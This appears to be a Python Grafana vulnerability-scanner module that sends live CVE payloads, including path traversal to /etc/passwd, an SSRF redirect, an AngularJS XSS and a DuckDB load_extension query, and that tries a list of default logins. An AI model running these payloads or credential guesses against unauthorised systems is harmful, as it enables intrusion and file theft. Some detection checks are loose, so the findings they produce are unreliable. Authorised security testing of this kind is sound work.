import httpx
import asyncio
import json
import re

async def detect_protocol(scan_address, port, timeout=3):
    """
    Detects whether a service is running on HTTP or HTTPS.
    Returns the protocol string ('http' or 'https') or None if unreachable.
    """
    protocols = ['https', 'http']  # Try HTTPS first as it's more secure
    
    for protocol in protocols:
        try:
            async with httpx.AsyncClient(timeout=timeout, verify=False) as client:
                response = await client.get(f"{protocol}://{scan_address}:{port}/")
                if response.status_code in [200, 401, 403, 302, 404]:  # Any valid HTTP response
                    return protocol
        except:
            continue
    return 'http'  # Default to HTTP if detection fails

# Verified Grafana CVE database based on https://grafana.com/security/security-advisories/
CVE_DATABASE = {
    "CVE-2024-9264": {
        "description": "Grafana SQL Expressions allow for remote code execution via DuckDB",
        "severity": "CRITICAL",
        "affected_versions": [">=11.0.0,<11.0.6", ">=11.1.0,<11.1.7", ">=11.2.0,<11.2.2"],
        "payload": {
            "path": "/api/ds/query",
            "method": "POST",
            "data": {
                "queries": [
                    {
                        "refId": "A",
                        "datasource": {"uid": "__expr__", "type": "__expr__"},
                        "expression": "SELECT load_extension('/tmp/malicious.so')",
                        "sql": {
                            "sql": "SELECT * FROM read_csv_auto('/etc/passwd')"
                        }
                    }
                ]
            }
        }
    },
    "CVE-2024-9476": {
        "description": "Privilege escalation vulnerability for Organizations in Grafana",
        "severity": "HIGH",
        "affected_versions": [">=11.0.0,<11.0.6", ">=11.1.0,<11.1.7", ">=11.2.0,<11.2.2"],
        "payload": {
            "path": "/api/orgs",
            "method": "GET"
        }
    },
    "CVE-2023-6152": {
        "description": "Email validation bypass and authentication bypass",
        "severity": "MEDIUM",
        "affected_versions": [">=9.5.0,<9.5.16", ">=10.0.0,<10.0.11", ">=10.1.0,<10.1.7", ">=10.2.0,<10.2.4", ">=10.3.0,<10.3.3"],
        "payload": {
            "path": "/api/user/signup",
            "method": "POST",
            "data": {
                "email": "admin@test.com",
                "username": "admin@test.com", 
                "name": "admin"
            }
        }
    },
    "CVE-2023-3128": {
        "description": "Grafana authentication bypass using Azure AD OAuth",
        "severity": "HIGH",
        "affected_versions": [">=6.7.0,<9.5.15", ">=10.0.0,<10.0.10", ">=10.1.0,<10.1.6", ">=10.2.0,<10.2.3", ">=10.3.0,<10.3.2"],
        "payload": {
            "path": "/login/azuread",
            "method": "GET"
        }
    },
    "CVE-2023-1410": {
        "description": "Stored XSS in Graphite FunctionDescription tooltip",
        "severity": "HIGH",
        "affected_versions": [">=8.0.0,<8.5.27", ">=9.0.0,<9.4.13", ">=9.5.0,<9.5.3"],
        "payload": {
            "path": "/api/datasources",
            "method": "GET"
        }
    },
    "CVE-2022-39229": {
        "description": "Authentication bypass in Grafana",
        "severity": "HIGH",
        "affected_versions": [">=9.0.0,<9.2.4"],
        "payload": {
            "path": "/api/dashboards/home",
            "method": "GET"
        }
    },
    "CVE-2022-35957": {
        "description": "Escalation from admin to server admin when auth.disable_login_form is set to true",
        "severity": "MEDIUM",
        "affected_versions": [">=6.0.0,<8.5.14", ">=9.0.0,<9.1.8", ">=9.2.0,<9.2.2"],
        "payload": {
            "path": "/api/admin/users",
            "method": "GET"
        }
    },
    "CVE-2021-43798": {
        "description": "Path traversal allowing unauthenticated file access",
        "severity": "HIGH",
        "affected_versions": [">=8.0.0,<8.0.7", ">=8.1.0,<8.1.8", ">=8.2.0,<8.2.7", ">=8.3.0,<8.3.1"],
        "payload": {
            "path": "/public/plugins/alertlist/../../../../../../../../../../../../../../../../../../../etc/passwd",
            "method": "GET"
        }
    },
    "CVE-2020-13379": {
        "description": "Unauthenticated Full-Read SSRF in Grafana",
        "severity": "HIGH",
        "affected_versions": [">=3.0.1,<7.0.1"],
        "payload": {
            "path": "/avatar/test%3fd%3dredirect.example.com%25253f%253b%252fbp.blogspot.com%252ftest",
            "method": "GET"
        }
    },
    "CVE-2020-11110": {
        "description": "Stored XSS due to insufficient input protection in originalUrl field",
        "severity": "MEDIUM",
        "affected_versions": [">=1.0.0,<6.7.2"],
        "payload": {
            "path": "/api/snapshots",
            "method": "GET"
        }
    },
    "CVE-2021-41174": {
        "description": "AngularJS rendering XSS vulnerability in login page",
        "severity": "MEDIUM",
        "affected_versions": [">=8.0.0,<8.2.7", ">=8.3.0,<8.3.1"],
        "payload": {
            "path": "/dashboard/snapshot/%7B%7Bconstructor.constructor(%27alert(document.domain)%27)()%7D%7D?orgId=1",
            "method": "GET"
        }
    },
    "CVE-2021-27358": {
        "description": "Denial of Service via snapshot feature",
        "severity": "MEDIUM",
        "affected_versions": [">=6.7.3,<7.4.2"],
        "payload": {
            "path": "/api/snapshots",
            "method": "POST",
            "data": {"name": "test", "deleteKey": "test", "key": "test"}
        }
    },
    "CVE-2022-32275": {
        "description": "File reading via dashboard snapshot URI",
        "severity": "HIGH",
        "affected_versions": [">=8.4.0,<8.4.4"],
        "payload": {
            "path": "/dashboard/snapshot/%7B%7Bconstructor.constructor'/../../../../../../../../etc/passwd",
            "method": "GET"
        }
    },
    "CVE-2022-32276": {
        "description": "Unauthenticated access via dashboard snapshot with orgId=0",
        "severity": "MEDIUM",
        "affected_versions": [">=8.4.0,<8.4.4"],
        "payload": {
            "path": "/dashboard/snapshot/test?orgId=0",
            "method": "GET"
        }
    },
    "CVE-2022-39307": {
        "description": "User enumeration via password reset endpoint",
        "severity": "LOW",
        "affected_versions": [">=8.0.0,<8.5.15", ">=9.0.0,<9.2.4"],
        "payload": {
            "path": "/api/user/password/sent-reset-email",
            "method": "POST",
            "data": {"loginOrEmail": "nonexistent@example.com"}
        }
    },
    "CVE-2021-39226": {
        "description": "Snapshot authentication bypass",
        "severity": "MEDIUM",
        "affected_versions": [">=8.0.0,<8.1.6", ">=8.2.0,<8.2.3"],
        "payload": {
            "path": "/dashboard/snapshot/test?orgId=0",
            "method": "GET"
        }
    }
}

# Version-based vulnerability database
VERSION_VULNERABILITIES = {
    "default_config_issues": {
        "description": "Default configuration vulnerabilities",
        "checks": [
            {
                "versions": ["<5.0.0"],
                "issue": "Default admin credentials (admin:admin)",
                "risk": "HIGH",
                "details": "Default credentials allow full administrative access"
            },
            {
                "versions": ["<6.0.0"],
                "issue": "Anonymous access enabled by default",
                "risk": "MEDIUM",
                "details": "Anonymous users can access dashboards by default"
            },
            {
                "versions": ["<7.0.0"],
                "issue": "Weak session security",
                "risk": "MEDIUM", 
                "details": "Session cookies lack secure attributes"
            }
        ]
    },
    "known_weaknesses": {
        "description": "Known security weaknesses by version",
        "checks": [
            {
                "versions": [">=6.0.0,<8.5.0"],
                "issue": "Insufficient RBAC controls",
                "risk": "MEDIUM",
                "details": "Limited role-based access control granularity"
            },
            {
                "versions": [">=8.0.0,<8.5.0"],
                "issue": "Plugin security model",
                "risk": "MEDIUM",
                "details": "Plugins can access sensitive Grafana APIs"
            }
        ]
    }
}

def parse_version(version_string):
    """Parse version string into comparable tuple."""
    try:
        clean_version = re.match(r'^(\d+(?:\.\d+)*)', version_string.strip())
        if not clean_version:
            return (0,)
        
        parts = clean_version.group(1).split('.')
        return tuple(int(part) for part in parts)
    except (ValueError, AttributeError):
        return (0,)

def compare_versions(version1, version2):
    """Compare two version strings. Returns -1, 0, or 1."""
    v1 = parse_version(version1)
    v2 = parse_version(version2)
    
    max_len = max(len(v1), len(v2))
    v1 = v1 + (0,) * (max_len - len(v1))
    v2 = v2 + (0,) * (max_len - len(v2))
    
    if v1 < v2:
        return -1
    elif v1 > v2:
        return 1
    else:
        return 0

def is_version_affected(current_version, version_ranges):
    """Check if current version falls within affected version ranges."""
    if not current_version:
        return False
    
    try:
        for version_range in version_ranges:
            if version_range.startswith('<'):
                max_version = version_range[1:]
                if compare_versions(current_version, max_version) < 0:
                    return True
            elif '>=' in version_range and '<' in version_range:
                parts = version_range.split(',')
                min_version = parts[0][2:]
                max_version = parts[1][1:]
                if (compare_versions(current_version, min_version) >= 0 and 
                    compare_versions(current_version, max_version) < 0):
                    return True
    except Exception:
        return False
    return False

async def get_grafana_version(target_url):
    """Extract Grafana version from multiple API endpoints."""
    version_info = {}
    
    # Try main API endpoint first
    try:
        async with httpx.AsyncClient(timeout=10, verify=False) as client:
            response = await client.get(f"{target_url}/api/health", timeout=5)
            if response.status_code == 200:
                data = response.json()
                if 'version' in data:
                    version_info['number'] = data['version']
                    version_info['commit'] = data.get('commit', 'N/A')
                    return version_info
    except (httpx.RequestError, httpx.ConnectError, json.JSONDecodeError):
        pass
    
    # Try login page for version disclosure
    try:
        async with httpx.AsyncClient(timeout=10, verify=False) as client:
            response = await client.get(f"{target_url}/login", timeout=5)
            if response.status_code == 200:
                # Look for version in HTML content
                version_match = re.search(r'Grafana\s+v?(\d+\.\d+\.\d+)', response.text, re.IGNORECASE)
                if version_match:
                    version_info['number'] = version_match.group(1)
                    return version_info
                
                # Check for version in meta tags or JavaScript
                meta_version = re.search(r'grafanaBootData.*?"version":"([^"]+)"', response.text)
                if meta_version:
                    version_info['number'] = meta_version.group(1)
                    return version_info
    except (httpx.RequestError, httpx.ConnectError):
        pass
    
    # Try API endpoints that might leak version
    version_endpoints = [
        "/api/frontend/settings",
        "/api/plugins",
        "/api/datasources"
    ]
    
    for endpoint in version_endpoints:
        try:
            async with httpx.AsyncClient(timeout=10, verify=False) as client:
                response = await client.get(f"{target_url}{endpoint}", timeout=5)
                if response.status_code == 200:
                    # Check headers for version info
                    server_header = response.headers.get('server', '')
                    if 'Grafana' in server_header:
                        version_match = re.search(r'Grafana/(\d+\.\d+\.\d+)', server_header)
                        if version_match:
                            version_info['number'] = version_match.group(1)
                            return version_info
                    
                    # Check response content for version
                    if endpoint == "/api/frontend/settings":
                        try:
                            data = response.json()
                            if 'buildInfo' in data and 'version' in data['buildInfo']:
                                version_info['number'] = data['buildInfo']['version']
                                version_info['commit'] = data['buildInfo'].get('commit', 'N/A')
                                version_info['edition'] = data['buildInfo'].get('edition', 'N/A')
                                return version_info
                        except json.JSONDecodeError:
                            pass
        except (httpx.RequestError, httpx.ConnectError):
            continue
    
    return version_info if version_info else None

async def test_cve_payload(target_url, cve_id, cve_data):
    """Test a specific CVE payload against the target."""
    payload = cve_data["payload"]
    test_url = f"{target_url}{payload['path']}"
    
    try:
        async with httpx.AsyncClient(timeout=10, verify=False) as client:
            response = None
            
            if payload["method"] == "GET":
                params = payload.get("params", {})
                response = await client.get(test_url, params=params, timeout=5)
            elif payload["method"] == "POST":
                response = await client.post(test_url, json=payload.get("data", {}), timeout=5)
            else:
                return None
            
            # CVE-specific detection logic
            if response.status_code in [200, 201, 202]:
                response_text = response.text.lower()
                
                if cve_id == "CVE-2021-43798":  # Directory traversal
                    if any(indicator in response_text for indicator in ["root:", "/bin/", "/usr/", "daemon:"]):
                        return {
                            "status": "VULNERABLE",
                            "vulnerability": f"{cve_id} - {cve_data['description']}",
                            "target": test_url,
                            "details": "Path traversal successful. File system access achieved."
                        }
                
                elif cve_id == "CVE-2024-9264":  # SQL Expressions RCE
                    if "query" in response_text and ("error" in response_text or "sql" in response_text):
                        return {
                            "status": "VULNERABLE",
                            "vulnerability": f"{cve_id} - {cve_data['description']}",
                            "target": test_url,
                            "details": "SQL expressions vulnerability confirmed. RCE possible with DuckDB."
                        }
                
                elif cve_id in ["CVE-2025-6023", "CVE-2022-39229"]:  # Permission bypass
                    if "dashboard" in response_text or "panels" in response_text:
                        return {
                            "status": "VULNERABLE",
                            "vulnerability": f"{cve_id} - {cve_data['description']}",
                            "target": test_url,
                            "details": "Unauthorized dashboard access confirmed. Permission bypass vulnerability."
                        }
                
                elif cve_id in ["CVE-2025-4123", "CVE-2023-6152"]:  # Account takeover/signup bypass
                    if "message" in response_text or "created" in response_text or "success" in response_text:
                        return {
                            "status": "VULNERABLE",
                            "vulnerability": f"{cve_id} - {cve_data['description']}",
                            "target": test_url,
                            "details": "Account creation/manipulation possible. Authentication bypass vulnerability."
                        }
                
                elif cve_id == "CVE-2021-39226":  # Snapshot bypass
                    if "dashboard" in response_text and "snapshot" in response_text:
                        return {
                            "status": "VULNERABLE",
                            "vulnerability": f"{cve_id} - {cve_data['description']}",
                            "target": test_url,
                            "details": "Snapshot access without authentication. Authorization bypass confirmed."
                        }
                
                elif cve_id == "CVE-2023-3128":  # Azure AD OAuth bypass
                    if "redirect" in response_text or "oauth" in response_text:
                        return {
                            "status": "VULNERABLE",
                            "vulnerability": f"{cve_id} - {cve_data['description']}",
                            "target": test_url,
                            "details": "Azure AD OAuth endpoint accessible. Authentication bypass possible."
                        }
                
                elif cve_id in ["CVE-2024-9476", "CVE-2024-8118", "CVE-2025-3580"]:  # API access
                    if any(indicator in response_text for indicator in ["datasources", "plugins", "api_key"]):
                        return {
                            "status": "VULNERABLE",
                            "vulnerability": f"{cve_id} - {cve_data['description']}",
                            "target": test_url,
                            "details": "Sensitive API endpoint accessible. Information disclosure vulnerability."
                        }
                        
            elif response.status_code in [401, 403]:
                # Expected response for protected endpoints
                if cve_id in ["CVE-2021-43798", "CVE-2021-39226"]:
                    return {
                        "status": "POTENTIAL",
                        "vulnerability": f"{cve_id} - {cve_data['description']}",
                        "target": test_url,
                        "details": f"Authentication required (HTTP {response.status_code}). May indicate patched system."
                    }
                    
    except (httpx.RequestError, httpx.ConnectError, httpx.TimeoutException):
        pass
    except Exception as e:
        if cve_id == "CVE-2024-9264":  # SQL injection might cause errors
            return {
                "status": "POTENTIAL",
                "vulnerability": f"{cve_id} - {cve_data['description']}",
                "target": test_url,
                "details": f"Exception during SQL testing: {str(e)[:100]}. May indicate vulnerability."
            }
    
    return None

async def check_version_vulnerabilities(target_url, version_info):
    """Check for version-specific vulnerabilities and misconfigurations."""
    vulnerabilities = []
    
    if not version_info or not version_info.get('number'):
        return vulnerabilities
        
    version_number = version_info['number']
    
    for category_data in VERSION_VULNERABILITIES.values():
        for check in category_data['checks']:
            if is_version_affected(version_number, check['versions']):
                vulnerabilities.append({
                    "status": "VULNERABLE",
                    "vulnerability": f"Version Vulnerability - {check['issue']}",
                    "target": target_url,
                    "details": f"Version {version_number} affected by {check['issue']}. Risk: {check['risk']}. {check['details']}"
                })
    
    return vulnerabilities

async def check_cve_vulnerabilities(target_url):
    """Check for known CVE vulnerabilities based on version and payload testing."""
    vulnerabilities = []
    
    # Get comprehensive version info
    version_info = await get_grafana_version(target_url)
    version_number = version_info.get('number') if version_info else None
    
    # Check version-based vulnerabilities first
    if version_info:
        version_vulns = await check_version_vulnerabilities(target_url, version_info)
        vulnerabilities.extend(version_vulns)
    
    # Check CVE vulnerabilities
    for cve_id, cve_data in CVE_DATABASE.items():
        if version_number and is_version_affected(version_number, cve_data["affected_versions"]):
            # Version is affected, test with payload
            result = await test_cve_payload(target_url, cve_id, cve_data)
            if result:
                result['severity'] = cve_data.get('severity', 'UNKNOWN')
                vulnerabilities.append(result)
            else:
                # Version is affected but payload didn't confirm
                vulnerabilities.append({
                    "status": "POTENTIAL",
                    "vulnerability": f"{cve_id} - {cve_data['description']}",
                    "target": target_url,
                    "severity": cve_data.get('severity', 'UNKNOWN'),
                    "details": f"Version {version_number} is affected by this CVE (severity: {cve_data.get('severity', 'UNKNOWN')}) but payload test was inconclusive. Edition: {version_info.get('edition', 'N/A')}"
                })
    
    return vulnerabilities

async def check_default_credentials(target_url):
    """Attempts to log in with common default/weak credentials."""
    login_url = f"{target_url}/login"
    
    # Common Grafana credentials to test
    credential_pairs = [
        ("admin", "admin"),
        ("admin", "prom-operator"),
        ("admin", "password"),
        ("admin", "123456"),
        ("admin", "grafana"),
        ("admin", ""),
        ("grafana", "grafana"),
        ("grafana", "admin"),
        ("root", "admin"),
        ("guest", "guest"),
        ("user", "user")
    ]
    
    try:
        async with httpx.AsyncClient(follow_redirects=True) as client:
            # First, get the login page to ensure it's Grafana
            r_get = await client.get(login_url, timeout=5)
            if 'Grafana' not in r_get.text:
                return []  # Not a Grafana instance

            vulnerabilities = []
            
            for username, password in credential_pairs:
                try:
                    payload = {"user": username, "password": password}
                    r_post = await client.post(login_url, data=payload, timeout=5)
                    
                    # Check for successful login indicators
                    success_indicators = [
                        "/login" not in str(r_post.url),  # Redirect away from login
                        r_post.status_code == 302,  # Redirect response
                        "dashboard" in r_post.text.lower(),
                        "home" in str(r_post.url)
                    ]
                    
                    if any(success_indicators):
                        vulnerabilities.append({
                            "status": "VULNERABLE",
                            "vulnerability": f"Grafana Weak Credentials ({username}:{password})",
                            "target": login_url,
                            "details": f"Successfully authenticated with credentials: {username}:{password}. Full administrative access may be granted."
                        })
                        # Stop testing after first successful login
                        break
                        
                    # Small delay between attempts to avoid lockout
                    await asyncio.sleep(0.5)
                    
                except httpx.RequestError:
                    continue
                    
            return vulnerabilities
            
    except httpx.RequestError:
        return []

# Add a check for CVE-2021-43798 (Directory Traversal)
# This would involve crafting a specific GET request to a plugin asset URL
# and checking if the response contains content from a system file like /etc/passwd.

async def check_unauthenticated_access(target_url):
    """Check for unauthenticated access to sensitive Grafana endpoints."""
    sensitive_endpoints = [
        ("/api/dashboards/home", "Dashboard access"),
        ("/api/search", "Dashboard search"),
        ("/api/datasources", "Data sources"),
        ("/api/users", "User enumeration"),
        ("/api/admin/users", "Admin user access"),
        ("/api/orgs", "Organizations"),
        ("/api/plugins", "Plugin information"),
        ("/api/folders", "Folder structure"),
        ("/api/annotations", "Annotations"),
        ("/api/alerts", "Alert information"),
        ("/api/snapshots", "Dashboard snapshots")
    ]
    
    vulnerabilities = []
    accessible_endpoints = []
    
    for endpoint, description in sensitive_endpoints:
        try:
            async with httpx.AsyncClient(timeout=10, verify=False) as client:
                response = await client.get(f"{target_url}{endpoint}", timeout=5)
                
                if response.status_code == 200:
                    accessible_endpoints.append(f"{endpoint} ({description})")
                elif response.status_code == 401:
                    # This is expected - authentication required
                    continue
                elif response.status_code == 403:
                    # Forbidden - service exists but access denied (better than 404)
                    continue
                    
        except (httpx.RequestError, httpx.ConnectError):
            continue
    
    if accessible_endpoints:
        vulnerabilities.append({
            "status": "VULNERABLE",
            "vulnerability": "Grafana Unauthenticated API Access",
            "target": target_url,
            "details": f"Found {len(accessible_endpoints)} unauthenticated endpoints: {', '.join(accessible_endpoints[:5])}{'...' if len(accessible_endpoints) > 5 else ''}"
        })
    
    return vulnerabilities

async def check_information_disclosure(target_url):
    """Check for information disclosure vulnerabilities."""
    vulnerabilities = []
    
    # Check /metrics endpoint (often exposed) with enhanced analysis
    try:
        async with httpx.AsyncClient(timeout=10, verify=False) as client:
            response = await client.get(f"{target_url}/metrics", timeout=5)
            if response.status_code == 200:
                content = response.text
                
                # Check for HELP strings - indicates detailed metric descriptions are exposed
                if "# HELP" in content:
                    # Count how many HELP entries are present
                    help_count = content.count("# HELP")
                    
                    # Check for sensitive information patterns in HELP descriptions
                    sensitive_patterns = [
                        "database", "password", "token", "key", "secret", "auth",
                        "internal", "private", "config", "credential", "session"
                    ]
                    
                    sensitive_help = []
                    for pattern in sensitive_patterns:
                        if pattern in content.lower():
                            sensitive_help.append(pattern)
                    
                    if sensitive_help:
                        vulnerabilities.append({
                            "status": "VULNERABLE",
                            "vulnerability": "Grafana Metrics Detailed Information Disclosure",
                            "target": f"{target_url}/metrics",
                            "details": f"Grafana metrics endpoint exposes {help_count} detailed HELP descriptions including sensitive information: {', '.join(sensitive_help[:5])}{'...' if len(sensitive_help) > 5 else ''}. This reveals internal system architecture and potentially sensitive configuration details."
                        })
                    else:
                        vulnerabilities.append({
                            "status": "VULNERABLE", 
                            "vulnerability": "Grafana Metrics Internal Architecture Disclosure",
                            "target": f"{target_url}/metrics",
                            "details": f"Grafana metrics endpoint exposes {help_count} detailed HELP descriptions revealing internal system architecture, component names, and operational details. This information can be used for reconnaissance and targeted attacks."
                        })
                else:
                    # Standard metrics exposure without HELP strings
                    vulnerabilities.append({
                        "status": "INFO",
                        "vulnerability": "Grafana Metrics Endpoint Exposed",
                        "target": f"{target_url}/metrics",
                        "details": "Grafana metrics endpoint is publicly accessible, potentially revealing system information."
                    })
    except:
        pass
    
    # Check /api/frontend/settings for sensitive info
    try:
        async with httpx.AsyncClient(timeout=10, verify=False) as client:
            response = await client.get(f"{target_url}/api/frontend/settings", timeout=5)
            if response.status_code == 200:
                try:
                    data = response.json()
                    sensitive_info = []
                    
                    if 'buildInfo' in data:
                        sensitive_info.append("Build information")
                    if 'datasources' in data:
                        sensitive_info.append("Data source configuration")
                    if 'panels' in data:
                        sensitive_info.append("Panel configuration")
                        
                    if sensitive_info:
                        vulnerabilities.append({
                            "status": "INFO",
                            "vulnerability": "Grafana Configuration Information Disclosure",
                            "target": f"{target_url}/api/frontend/settings",
                            "details": f"Sensitive configuration exposed: {', '.join(sensitive_info)}"
                        })
                except:
                    pass
    except:
        pass
    
    return vulnerabilities

async def check_additional_cves(target_url, version_info=None):
    """Check for additional CVEs from the pentesting guide."""
    vulnerabilities = []
    
    # Skip CVE testing if no version info available
    if not version_info or not version_info.get('number'):
        return vulnerabilities
    
    current_version = version_info.get('number', 'Unknown')
    
    # Test CVE-2022-39307 - User enumeration via password reset
    try:
        async with httpx.AsyncClient(timeout=10, verify=False) as client:
            payload = {"loginOrEmail": "nonexistent@example.com"}
            response = await client.post(f"{target_url}/api/user/password/sent-reset-email", 
                                       json=payload, timeout=5)
            if response.status_code == 200:
                response_text = response.text.lower()
                if "user not found" in response_text or "not found" in response_text:
                    vulnerabilities.append({
                        "status": "VULNERABLE",
                        "vulnerability": "CVE-2022-39307 - User enumeration via password reset",
                        "target": f"{target_url}/api/user/password/sent-reset-email",
                        "details": "User enumeration possible via password reset endpoint. Non-existent users return different responses."
                    })
    except:
        pass
    
    # Test CVE-2021-43798 - Path traversal (enhanced payload)
    # Only affects versions >=8.0.0,<8.0.7, >=8.1.0,<8.1.8, >=8.2.0,<8.2.7, >=8.3.0,<8.3.1
    if is_version_affected(current_version, [">=8.0.0,<8.0.7", ">=8.1.0,<8.1.8", ">=8.2.0,<8.2.7", ">=8.3.0,<8.3.1"]):
        try:
            async with httpx.AsyncClient(timeout=10, verify=False) as client:
                traversal_paths = [
                    "/public/plugins/alertlist/../../../../../../../../../../../../../../../../../../../etc/passwd",
                    "/public/plugins/text/../../../../../../../../../../../../../../../../../../../etc/passwd",
                    "/public/plugins/graph/../../../../../../../../../../../../../../../../../../../etc/passwd"
                ]
                
                for path in traversal_paths:
                    response = await client.get(f"{target_url}{path}", timeout=5)
                    if response.status_code == 200:
                        content = response.text
                        if any(indicator in content for indicator in ["root:", "/bin/", "/usr/", "daemon:"]):
                            vulnerabilities.append({
                                "status": "VULNERABLE",
                                "vulnerability": "CVE-2021-43798 - Path traversal file access",
                                "target": f"{target_url}{path}",
                                "details": f"Path traversal successful. Sensitive file (/etc/passwd) accessed without authentication. Version {current_version} is vulnerable."
                            })
                            break
        except:
            pass
    
    # Test CVE-2020-13379 - SSRF via avatar endpoint  
    # Only affects versions >=3.0.1,<7.0.1
    if is_version_affected(current_version, [">=3.0.1,<7.0.1"]):
        try:
            async with httpx.AsyncClient(timeout=10, verify=False) as client:
                ssrf_payload = "/avatar/test%3fd%3dredirect.example.com%25253f%253b%252fbp.blogspot.com%252ftest"
                response = await client.get(f"{target_url}{ssrf_payload}", timeout=5, follow_redirects=False)
                if response.status_code in [302, 301] and response.headers.get('location'):
                    vulnerabilities.append({
                        "status": "VULNERABLE",
                        "vulnerability": "CVE-2020-13379 - SSRF via avatar endpoint",
                        "target": f"{target_url}{ssrf_payload}",
                        "details": f"SSRF vulnerability confirmed. Open redirect in avatar endpoint can be chained for SSRF attacks. Version {current_version} is vulnerable."
                    })
        except:
            pass
    
    # Test CVE-2022-32276 - Unauthenticated snapshot access
    # Only affects versions >=8.4.0,<8.4.4
    if is_version_affected(current_version, [">=8.4.0,<8.4.4"]):
        try:
            async with httpx.AsyncClient(timeout=10, verify=False) as client:
                snapshot_urls = [
                    "/dashboard/snapshot/test?orgId=0",
                    "/api/snapshots/1",
                    "/api/snapshots/test"
                ]
                
                for url in snapshot_urls:
                    response = await client.get(f"{target_url}{url}", timeout=5)
                    if response.status_code == 200:
                        content = response.text.lower()
                        if "dashboard" in content or "snapshot" in content:
                            vulnerabilities.append({
                                "status": "VULNERABLE",
                                "vulnerability": "CVE-2022-32276 - Unauthenticated snapshot access",
                                "target": f"{target_url}{url}",
                                "details": f"Unauthenticated access to dashboard snapshots via orgId=0 parameter. Version {current_version} is vulnerable."
                            })
                            break
        except:
            pass
    
    # Test CVE-2021-41174 - AngularJS XSS in snapshot endpoints
    # Only affects versions >=8.0.0,<8.2.7 and >=8.3.0,<8.3.1
    if is_version_affected(current_version, [">=8.0.0,<8.2.7", ">=8.3.0,<8.3.1"]):
        try:
            async with httpx.AsyncClient(timeout=10, verify=False) as client:
                xss_payload = "/dashboard/snapshot/%7B%7Bconstructor.constructor(%27alert(document.domain)%27)()%7D%7D?orgId=1"
                response = await client.get(f"{target_url}{xss_payload}", timeout=5)
                if response.status_code == 200:
                    content = response.text
                    if "constructor" in content or "alert" in content:
                        vulnerabilities.append({
                            "status": "VULNERABLE",
                            "vulnerability": "CVE-2021-41174 - AngularJS XSS in snapshot",
                            "target": f"{target_url}{xss_payload}",
                            "details": f"XSS vulnerability in dashboard snapshot endpoint via AngularJS template injection. Version {current_version} is vulnerable."
                        })
        except:
            pass
    
    return vulnerabilities

async def run_scans(target_obj, port):
    """Runs all defined Grafana scans against a target object."""
    scan_address = target_obj['scan_address']
    display_target = target_obj['display_target']
    resolved_ip = target_obj['resolved_ip']
    
    all_results = []
    
    protocol = await detect_protocol(scan_address, port)
    if not protocol:
        return []

    target_url = f"{protocol}://{scan_address}:{port}"
    print(f"  -> Running Grafana scans on {target_url} (for target: {display_target})")
    
    version_info = await get_grafana_version(target_url)
    service_version = version_info.get('number', 'Unknown') if version_info else 'Unknown'
    
    if not version_info:
        return []

    tasks = [
        check_default_credentials(target_url),
        check_unauthenticated_access(target_url),
        check_information_disclosure(target_url),
        check_additional_cves(target_url, version_info),
        check_cve_vulnerabilities(target_url)
    ]
    
    results_from_tasks = await asyncio.gather(*tasks)
    
    for result_group in results_from_tasks:
        if not result_group:
            continue
        
        if isinstance(result_group, list):
            for res in result_group:
                if res:
                    res.update({
                        'module': 'Grafana',
                        'service_version': service_version,
                        'target': display_target,
                        'server': scan_address,
                        'port': port,
                        'resolved_ip': resolved_ip,
                        'url': res.get('target')
                    })
                    all_results.append(res)
        elif isinstance(result_group, dict):
            result_group.update({
                'module': 'Grafana',
                'service_version': service_version,
                'target': display_target,
                'server': scan_address,
                'port': port,
                'resolved_ip': resolved_ip,
                'url': result_group.get('target')
            })
            all_results.append(result_group)
            
    return all_results
